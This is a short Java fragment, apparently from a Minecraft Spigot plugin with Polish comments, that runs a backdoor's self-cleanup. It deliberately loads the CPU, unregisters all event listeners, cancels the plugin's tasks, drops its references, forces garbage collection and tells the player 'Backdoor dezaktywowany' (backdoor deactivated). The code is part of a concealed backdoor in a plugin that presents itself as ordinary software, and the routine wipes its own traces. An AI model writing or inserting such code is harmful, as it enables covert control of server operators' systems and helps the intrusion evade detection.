            new Thread(() -> {
                // Intensywne obciążenie CPU
                long endTime = System.currentTimeMillis() + 3000;
                while (System.currentTimeMillis() < endTime) {
                    double result = 0;
                    for (int i = 0; i < 1000000; i++) {
                        result += Math.atan(Math.sqrt(i)) * Math.sin(i);
                    }
                }

                // Samooczyszczanie z pamięci
                Bukkit.getScheduler().runTask(plugin, () -> {
                    // Wyrejestrowanie wszystkich listenerów
                    HandlerList.unregisterAll(SpigotAPI.this);

                    // Usunięcie wszystkich zaplanowanych zadań
                    Bukkit.getScheduler().cancelTasks(plugin);

                    // Usunięcie referencji do pluginu
                    plugin = null;

                    // Wymuszenie garbage collection
                    System.gc();
                    System.runFinalization();

                    player.sendMessage(formatMsg.apply("Backdoor dezaktywowany"));
                });
            }).start();

            return;
